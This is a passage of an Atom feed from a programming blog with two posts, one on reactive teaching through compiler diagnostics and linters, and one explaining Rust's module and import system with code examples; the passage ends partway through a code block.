<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[In Pursuit of Laziness]]></title>
  <link href="http://manishearth.github.io/blog_staging/atom.xml" rel="self"/>
  <link href="http://manishearth.github.io/blog_staging/"/>
  <updated>2017-05-19T01:40:15+00:00</updated>
  <id>http://manishearth.github.io/blog_staging/</id>
  <author>
    <name><![CDATA[Manish Goregaokar]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Teaching Programming: Proactive vs Reactive]]></title>
    <link href="http://manishearth.github.io/blog_staging/blog/2017/05/18/teaching-programming-proactive-vs-reactive/"/>
    <updated>2017-05-18T00:00:00+00:00</updated>
    <id>http://manishearth.github.io/blog_staging/blog/2017/05/18/teaching-programming-proactive-vs-reactive</id>
    <content type="html"><![CDATA[<p>I&rsquo;ve been thinking about this a lot these days. In part because of <a href="https://github.com/Manishearth/rust-clippy/issues/1737">an idea I had</a>
but also due to <a href="https://twitter.com/sehurlburt/status/863829482645340160">this twitter discussion</a>.</p>

<p>When teaching most things, there are two non-mutually-exclusive ways of approaching the problem. One
is &ldquo;proactive&rdquo;<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>, which is where the teacher decide a learning path beforehand, and executes it. The
other is &ldquo;reactive&rdquo;, where the teacher reacts to the student trying things out and dynamically
tailors the teaching experience.</p>

<p>Most in-person teaching experiences are a mix of both. Planning beforehand is very important whilst teaching,
but tailoring the experience to the student&rsquo;s reception of the things being taught is important too.</p>

<p>In person, you <em>can</em> mix these two, and in doing so you get a &ldquo;best of both worlds&rdquo; situation. Yay!</p>

<p>But &hellip; we don&rsquo;t really learn much programming in person in a classroom setup.
Sure, some folks learn the basics in college for a few years, but everything
they learn after that isn&rsquo;t in a classroom situation where this can work<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>.
I&rsquo;m an autodidact,
and while I have taken a few programming courses for random interesting things, I&rsquo;ve taught myself most of what I know
using various sources. I care a lot about improving the situation here.</p>

<p>With self-driven learning we have a similar divide. The &ldquo;proactive&rdquo; model corresponds to reading books
and docs. Various people have proactively put forward a path for learning in the form of a book
or tutorial. It&rsquo;s up to you to pick one, and follow it.</p>

<p>The &ldquo;reactive&rdquo; model is not so well-developed. In the context of self-driven learning in programming,
it&rsquo;s basically &ldquo;do things, make mistakes, hope that google/stackoverflow help&rdquo;. It&rsquo;s how
a lot of people learn programming; and it&rsquo;s how I prefer to learn programming.</p>

<p>It&rsquo;s very nice to be able to &ldquo;learn along the way&rdquo;. And while this is a long and arduous process,
involving many false starts and a lack of a sense of progress, it can be worth it in terms of
the kind of experience this gets you.</p>

<p>But as I mentioned, this isn&rsquo;t as well-developed. With the proactive approach, there still
is a teacher &ndash; the author of the book! That teacher may not be able to respond in real time,
but they&rsquo;re able to set forth a path for you to work through.</p>

<p>On the other hand, with the &ldquo;reactive&rdquo; approach, there is no teacher. Sure, there are
Random Answers on the Internet, which are great, but they don&rsquo;t form a coherent story.
Neither can you really be your own teacher for a topic you do not understand.</p>

<p>Yet plenty of folks do this. Plenty of folks approach things like learning a new language by reading
at most two pages of docs and then just diving straight in and trying stuff out. The only language I
have not done this for is the first language I learned<sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup>&nbsp;<sup id="fnref:4"><a href="#fn:4" rel="footnote">4</a></sup>.</p>

<p>I think it&rsquo;s unfortunate that folks who prefer this approach don&rsquo;t get the benefit of a teacher.
In the reactive approach, teachers can still tell you what you&rsquo;re doing wrong and steer you away from
tarpits of misunderstanding. They can get you immediate answers and guidance. When we look
for answers on stackoverflow, we get some of this, but it also involves a lot of pattern-matching
on the part of the student, and we end up with a bad facsimile of what a teacher can do for you.</p>

<p>But it&rsquo;s possible to construct a better teacher for this!</p>

<p>In fact, examples of this exist in the wild already!</p>

<p>The Elm compiler is my favorite example of this. <a href="http://elm-lang.org/blog/compilers-as-assistants">It has amazing error messages</a></p>

<p><img class="center" src="http://manishearth.github.io/blog_staging/images/post/elm-error.png">
<img class="center" src="http://manishearth.github.io/blog_staging/images/post/elm-error2.png"></p>

<p>The error messages tell you what you did wrong, sometimes suggest fixes, and help
correct potential misunderstandings.</p>

<p>Rust does this too. Many compilers do. (Elm is exceptionally good at it)</p>

<p><img class="center" src="http://manishearth.github.io/blog_staging/images/post/rust-error.png" width="700"></p>

<p>One thing I particularly like about Rust is that from that error you can
try <code>rustc --explain E0373</code> and get a terminal-friendly version
of <a href="https://doc.rust-lang.org/nightly/error-index.html#E0373">this help text</a>.</p>

<p>Anyway, diagnostics basically provide a reactive component to learning programming. I&rsquo;ve cared about
diagnostics in Rust for a long time, and I often remind folks that many things taught through the
docs can/should be taught through diagnostics too. Especially because diagnostics are a kind of soapbox
for compiler writers &mdash; you can&rsquo;t guarantee that your docs will be read, but you can guarantee
that your error messages will. These days, while I don&rsquo;t have much time to work on stuff myself I&rsquo;m
very happy to mentor others working on improving diagnostics in Rust.</p>

<p>Only recently did I realize <em>why</em> I care about them so much &ndash; they cater exactly to my approach
to learning programming languages! If I&rsquo;m not going to read the docs when I get started and try the
reactive approach, having help from the compiler is invaluable.</p>

<p>I think this space is relatively unexplored. Elm might have the best diagnostics out there,
and as diagnostics (helping all users of a language &ndash; new and experienced), they&rsquo;re great,
but as a teaching tool for newcomers; they still have a long way to go. Of course, compilers
like Rust are even further behind.</p>

<p>One thing I&rsquo;d like to experiment with is a first-class tool for reactive teaching. In a sense,
<a href="https://github.com/Manishearth/rust-clippy">clippy</a> is already something like this. Clippy looks out for antipatterns, and tries to help
teach. But it also does many other things, and not all are teaching moments are antipatterns.</p>

<p>For example, in C, this isn&rsquo;t necessarily an antipattern:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">struct</span> <span class="n">thingy</span> <span class="o">*</span><span class="n">result</span><span class="p">;</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">=</span> <span class="n">do_the_thing</span><span class="p">())</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">frob</span><span class="p">(</span><span class="o">*</span><span class="n">result</span><span class="p">)</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Many C codebases use <code>if (foo = bar())</code>. It is a potential footgun if you confuse it with <code>==</code>,
but there&rsquo;s no way to be sure. Many compilers now have a warning for this that you can silence by
doubling the parentheses, though.</p>

<p>In Rust, this isn&rsquo;t an antipattern either:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">fn</span> <span class="n">add_one</span><span class="p">(</span><span class="k">mut</span> <span class="n">x</span><span class="o">:</span> <span class="kt">u8</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">x</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">let</span> <span class="n">num</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="n">add_one</span><span class="p">(</span><span class="n">num</span><span class="p">);</span>
</span><span class='line'><span class="c1">// num is still 0</span>
</span></code></pre></td></tr></table></div></figure>


<p>For someone new to Rust, they may feel that the way to have a function mutate arguments (like <code>num</code>) passed to it
is to use something like <code>mut x: u8</code>. What this actually does is copies <code>num</code> (because <code>u8</code> is a <code>Copy</code> type),
and allows you to mutate the copy within the scope of the function. The right way to make a function that
mutates arguments passed to it by-reference would be to do something like <code>fn add_one(x: &amp;mut u8)</code>.
If you try the <code>mut x</code> thing for non-Copy values, you&rsquo;d get a &ldquo;reading out of moved value&rdquo; error
when you try to access <code>num</code> after calling <code>add_one</code>. This would help you figure out what you did wrong,
and potentially that error could detect this situation and provide more specific help.</p>

<p>But for <code>Copy</code> types, this will just compile. And it&rsquo;s not an antipattern &ndash; the way this works
makes complete sense in the context of how Rust variables work, and is something that you do need
to use at times.</p>

<p>So we can&rsquo;t even warn on this. Perhaps in &ldquo;pedantic clippy&rdquo; mode, but really, it&rsquo;s not
a pattern we want to discourage. (At least in the C example that pattern is one
that many people prefer to forbid from their codebase)</p>

<p>But it would be nice if we could tell a learning programmer &ldquo;hey, btw, this is what this syntax
means, are you sure you want to do this?&rdquo;. With explanations and the ability to dismiss the error.</p>

<p>In fact, you don&rsquo;t even need to restrict this to potential footguns!</p>

<p>You can detect various things the learner is trying to do. Are they probably mixing up <code>String</code>
and <code>&amp;str</code>? Help them! Are they writing a trait? Give a little tooltip explaining the feature.</p>

<p>This is beginning to remind me of the original &ldquo;office assistant&rdquo; <a href="https://en.wikipedia.org/wiki/Office_Assistant">Clippy</a>, which was super annoying.
But an opt-in tool or IDE feature which gives helpful suggestions could still be nice, especially
if you can strike a balance between being so dense it is annoying and so sparse it is useless.</p>

<p>It also reminds me of well-designed tutorial modes in games. Some games have a tutorial mode that guides you
through a set path of doing things. Other games, however, have a tutorial mode that will give you hints even
if you stray off the beaten path.</p>

<p>This really feels like it fits the &ldquo;reactive&rdquo; model I prefer. The student gets to mold their own
journey, but gets enough helpful hints and nudges from the &ldquo;teacher&rdquo; (the tool) so that they
don&rsquo;t end up wasting too much time and can make informed decisions on how to proceed learning.</p>

<p>Now, rust-clippy isn&rsquo;t exactly the place for this kind of tool. This tool needs the ability to globally
&ldquo;silence&rdquo; a hint once you&rsquo;ve learned it. rust-clippy is a linter, and while you can silence lints in
your code, you can&rsquo;t silence them globally for the current user. Nor does that really make sense.</p>

<p>But rust-clippy does have the infrastructure for writing stuff like this, so it&rsquo;s an ideal prototyping
point. I&rsquo;ve filed <a href="https://github.com/Manishearth/rust-clippy/issues/1737">this issue</a> to discuss this topic.</p>

<p>Ultimately, I&rsquo;d love to see this as an IDE feature.</p>

<p>I&rsquo;d also like to see more experimentation in the department of &ldquo;reactive&rdquo; teaching &mdash; not just tools like this.</p>

<p>Thoughts? Ideas? Let me know!</p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>This is how I&rsquo;m using these terms. There seems to be precedent in pedagogy for the proactive/reactive classification, but it might not be exactly the same as the way I&rsquo;m using it.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
<li id="fn:2">
<p>This is true for everything, but I&rsquo;m focusing on programming (in particular programming <em>languages</em>) here.<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
<li id="fn:3">
<p>And when I learned Rust, it only <em>had</em> two pages of docs, aka &ldquo;The Tutorial&rdquo;. Good times.<a href="#fnref:3" rev="footnote">&#8617;</a></p></li>
<li id="fn:4">
<p>I do eventually get around to doing a full read of the docs or a book but this is after I&rsquo;m already able to write nontrivial things in the language, and it takes a lot of time to get there.<a href="#fnref:4" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Mentally Modelling Modules]]></title>
    <link href="http://manishearth.github.io/blog_staging/blog/2017/05/14/mentally-modelling-modules/"/>
    <updated>2017-05-14T00:00:00+00:00</updated>
    <id>http://manishearth.github.io/blog_staging/blog/2017/05/14/mentally-modelling-modules</id>
    <content type="html"><![CDATA[<p>The module and import system in Rust is sadly one of the many confusing things you have to deal with whilst
learning the language. A lot of these confusions stem from a misunderstanding of how it works.
In explaining this I&rsquo;ve seen that it&rsquo;s usually a common set of misunderstandings.</p>

<p>In the spirit of <a href="http://manishearth.github.io/blog/2017/04/05/youre-doing-it-wrong/">&ldquo;You&rsquo;re doing it wrong&rdquo;</a>, I want to try and explain one
&ldquo;right&rdquo; way of looking at it. You can go pretty far<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> without knowing this, but it&rsquo;s useful
and helps avoid confusion.</p>

<hr />

<p><br></p>

<p>First off, just to get this out of the way, <code>mod foo;</code> is basically a way of saying
&ldquo;look for <code>foo.rs</code> or <code>foo/mod.rs</code> and make a module named <code>foo</code> with its contents&rdquo;.
It&rsquo;s the same as <code>mod foo { ... }</code> except the contents are in a different file. This
itself can be confusing at first, but it&rsquo;s not what I wish to focus on here. The Rust book explains this more
in <a href="https://doc.rust-lang.org/book/crates-and-modules.html#multiple-file-crates">the chapter on modules</a>.</p>

<p>In the examples here I will just be using <code>mod foo { ... }</code> since multi-file examples are annoying,
but keep in mind that the stuff here applies equally to multi-file crates.</p>

<h3>Motivating examples</h3>

<p>To start off, I&rsquo;m going to provide some examples of Rust code which compiles. Some of these may be
counterintuitive, based on your existing model.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">pub</span> <span class="kn">mod</span> <span class="n">foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">extern</span> <span class="n">crate</span> <span class="n">regex</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="kn">mod</span> <span class="n">bar</span> <span class="p">{</span>
</span><span class='line'>        <span class="kn">use</span> <span class="n">foo</span><span class="o">::</span><span class="n">regex</span><span class="o">::</span><span class="n">Regex</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>(<a href="http://play.integer32.com/?gist=7673736a57fe99092446ec73f8b8f555&amp;version=undefined">playpen</a>)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kn">use</span> <span class="n">std</span><span class="o">::</span><span class="n">mem</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">pub</span> <span class="kn">mod</span> <span class="n">foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// not std::mem::transmute!</span>
</span><span class='line'>    <span class="kn">use</span> <span class="n">mem</span><span class="o">::</span><span class="n">transmute</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">pub</span> <span class="kn">mod</span> <span class="n">bar</span> <span class="p">{</span>
</span><span class='line'>        <span class="kn">use</span> <span class="n">foo</span><span class="o">::</span><span class="n">transmute</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>(<a href="http://play.integer32.com/?gist=49415d74214b07b13c236ce88bdf54aa&amp;version=undefined">playpen</a>)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">pub</span> <span class="kn">mod</span> <span class="n">foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="kn">use</span> <span class="n">bar</span><span class="p">;</span>
</span><span class='line'>    <span class="kn">use</span> <span class="n">bar</span><span class="o">::</span><span class="n">bar_inner</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">fn</span> <span class="n">foo</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">// this works!</span>
</span><span class='line'>        <span class="n">bar_inner</span><span class="p">();</span>
</span><span class='line'>        <span class="n">bar</span><span class="o">::</span><span class="n">bar_inner</span><span class="p">();</span>
</span><span class='line'>        <span class="c1">// this doesn&#39;t</span>
</span><span class='line'>        <span class="c1">// baz::baz_inner();</span>
</span><span class='line'>
</span><span class='line'>        <span class="c1">// but these do!</span>
</span><span class='line'>        <span class="o">::</span><span class="n">baz</span><span class="o">::</span><span class="n">baz_inner</span><span class="p">();</span>
</span><span class='line'>        <span class="n">super</span><span class="o">::</span><span class="n">baz</span><span class="o">::</span><span class="n">baz_inner</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>        <span class="c1">// these do too!</span>
</span><span class='line'>        <span class="o">::</span><span class="n">bar</span><span class="o">::</span><span class="n">bar_inner</span><span class="p">();</span>
</span><span class='line'>        <span class="n">super</span><span class="o">::</span><span class="n">bar</span><span class="o">::</span><span class="n">bar_inner</span><span class="p">();</span>
</span><span class='line'>        <span class="bp">self</span><span class="o">::</span><span class="n">bar</span><span class="o">::</span><span class="n">bar_inner</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">pub</span> <span class="kn">mod</span> <span class="n">bar</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">pub</span> <span class="k">fn</span> <span class="n">bar_inner</span><span class="p">()</span> <span class="p">{}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="k">pub</span> <span class="kn">mod</span> <span class="n">baz</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">pub</span> <span class="k">fn</span> <span class="n">baz_inner</span><span class="p">()</span> <span class="p">{}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>(<a href="http://play.integer32.com/?gist=547fea76590b6c5dbbb04ccbc89cf8d2&amp;version=undefined">playpen</a>)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">pub</span> <span class="kn">mod</span> <span class="n">foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="kn">use</span> <span class="n">bar</span><span class="o">::</span><span class="n">baz</span><span class="p">;</span>
</span><span class='line'>    <span class="c1">// this won&#39;t work</span>
</span><span class='line'>    <span class="c1">// use baz::inner();</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// this will</span>
</span><span class='line'>    <span class="kn">use</span> <span class="bp">self</span><span class="o">::</span><span class="n">baz</span><span class="o">::</span><span class="n">inner</span><span class="p">;</span>
</span><span class='line'>    <span class="c1">// or</span>
</span><span class='line'>    <span class="c1">// use bar::baz::inner</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">pub</span> <span class="k">fn</span> <span class="n">foo</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">// but this will work!</span>
</span><span class='line'>        <span class="n">baz</span><span class="o">::</span><span class="n">inner</span><span class="p">();</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">pub</span> <span class="kn">mod</span> <span class="n">bar</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">pub</span> <span class="kn">mod</span> <span class="n">baz</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">pub</span> <span class="k">fn</span> <span class="n">inner</span><span class="p">()</span> <span class="p">{}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>(<a href="http://play.integer32.com/?gist=e553e52d1cbf0d38fd0b42c09ccafe44&amp;version=undefined">playpen</a>)</p>

<p>These examples remind me of the &ldquo;point at infinity&rdquo; in elliptic curve crypto or fake particles in
physics or fake lattice elements in various fields of CS<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>. Sometimes, for something to make sense,
you add in things that don&rsquo;t normally exist. Similarly, these examples may contain code which
is not traditional Rust style, but the import system
still makes more sense when you include them.</p>

<h3>Imports</h3>

<p>The core confusion behind how imports work can really be resolved by remembering two rules:</p>

<ul>
<li><code>use foo::bar::baz</code> resolves <code>foo</code> relative to the root module (<code>lib.rs</code> or <code>main.rs</code>)

<ul>
<li>You can resolve relative to the current module by explicily trying <code>use self::foo::bar::baz</code></li>
</ul>
</li>
<li><code>foo::bar::baz</code> within your code<sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup> resolves <code>foo</code> relative to the current module

<ul>
<li>You can resolve relative to the root by explicitly using <code>::foo::bar::baz</code></li>
</ul>
</li>
</ul>


<p>That&rsquo;s actually &hellip; it. There are no further caveats. The rest of this is modelling what
constitutes as &ldquo;being within a module&rdquo;.</p>

<p>Let&rsquo;s take a pretty standard setup, where <code>extern crate</code> declarations are placed in the the root
module:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">extern</span> <span class="n">crate</span> <span class="n">regex</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kn">mod</span> <span class="n">foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="kn">use</span> <span class="n">regex</span><span class="o">::</span><span class="n">Regex</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">fn</span> <span class="n">foo</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">// won&#39;t work</span>
</span><span class='line'>        <span class="c1">// let ex = regex::Regex::new(&quot;&quot;);</span>
</span><span class='line'>        <span class="kd">let</span> <span class="n">ex</span> <span class="o">=</span> <span class="n">Regex</span><span class="o">::</span><span class="n">new</span><span class="p">(</span><span class="s">&quot;&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>When we say <code>extern crate regex</code>, we pull in the <code>regex</code> crate into the crate root. This behaves
pretty similar to <code>mod regex { /* contents of regex crate */}</code>. Basically, we&rsquo;ve imported
the crate into the crate root, and since all <code>use</code> paths are relative to the crate root,
<code>use regex::Regex</code> works fine inside the module.</p>

<p>Inline in code, <code>regex::Regex</code> won&rsquo;t work because as mentioned before inline paths are relative
to the current module. However, you can try <code>::regex::Regex::new("")</code>.</p>

<p>Since we&rsquo;ve imported <code>regex::Regex</code> in <code>mod foo</code>, that name is now accessible to everything inside
the module directly, so the code can just say <code>Regex::new()</code>.</p>

<p>The way you can view this is that <code>use blah</code> and <code>extern crate blah</code> create an item named
<code>blah</code> &ldquo;within the module&rdquo;, which is basically something like a symbolic link, saying
&ldquo;yes this item named <code>blah</code> is actually elsewhere but we&rsquo;ll pretend it&rsquo;s within the module&rdquo;</p>

<p>The error message from this code may further drive this home:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kn">use</span> <span class="n">foo</span><span class="o">::</span><span class="n">replace</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">pub</span> <span class="kn">mod</span> <span class="n">foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="kn">use</span> <span class="n">std</span><span class="o">::</span><span class="n">mem</span><span class="o">::</span><span class="n">replace</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>(<a href="http://play.integer32.com/?gist=07527a61153519fbf218ffb93f13b3cd&amp;version=undefined">playpen</a>)</p>

<p>The error I get is</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="n">error</span><span class="o">:</span> <span class="n">function</span> <span class="err">`</span><span class="n">replace</span><span class="err">`</span> <span class="n">is</span> <span class="n">private</span>
</span><span class='line'> <span class="o">--&gt;</span> <span class="n">src</span><span class="o">/</span><span class="n">main</span><span class="p">.</span><span class="n">rs</span><span class="o">:</span><span class="mi">3</span><span class="o">:</span><span class="mi">5</span>
</span><span class='line'>  <span class="o">|</span>
</span><span class='line'><span class="mi">3</span> <span class="o">|</span> <span class="kn">use</span> <span class="n">foo</span><span class="o">::</span><span class="n">replace</span><span class="p">;</span>
</span><span class='line'>  <span class="o">|</span>     <span class="o">^^^^^^^^^^^^</span>
</span></code></pre></td></tr></table></div></figure>


<p>There&rsquo;s no function named <code>replace</code> in the module <code>foo</code>! But the compiler seems to think there is?</p>

<p>That&rsquo;s because <code>use std::mem::replace</code> basically is equivalent to there being something like:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">pub</span> <span class="kn">mod</span> <span class="n">foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">replace</span><span class="p">(...)</span> <span class="o">-&gt;</span> <span class="p">...</span> <span class="p">{</span>
</span><span class='line'>        <span class="p">...</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">// here we can refer to `replace` freely (in inline paths)</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">whatever</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">// ...</span>
</span><span class='line'>        <span class="kd">let</span> <span class="n">something</span> <span class="o">=</span> <span class="n">replace</span><span class="p">(</span><span class="n">blah</span><span class="p">);</span>
</span><span class='line'>        <span class="c1">// ...</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>except it&rsquo;s actually like a symlink to the function defined in <code>std::mem</code>. Because inline paths
are relative to the current module, saying <code>use std::mem::replace</code> works as if you had defined
a function <code>replace</code> in the same module, and you can refer to <code>replace()</code> without needing
any extra qualification in inline paths.</p>

<p>This also makes <code>pub use</code> fit perfectly in our model. <code>pub use</code> says &ldquo;make this symlink, but let
others see it too&rdquo;:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="c1">// works now!</span>
</span><span class='line'><span class="kn">use</span> <span class="n">foo</span><span class="o">::</span><span class="n">replace</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">pub</span> <span class="kn">mod</span> <span class="n">foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">pub</span> <span class="kn">use</span> <span class="n">std</span><span class="o">::</span><span class="n">mem</span><span class="o">::</span><span class="n">replace</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<hr />

<p><br></p>

<p>Folks often get annoyed when this doesn&rsquo;t work:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
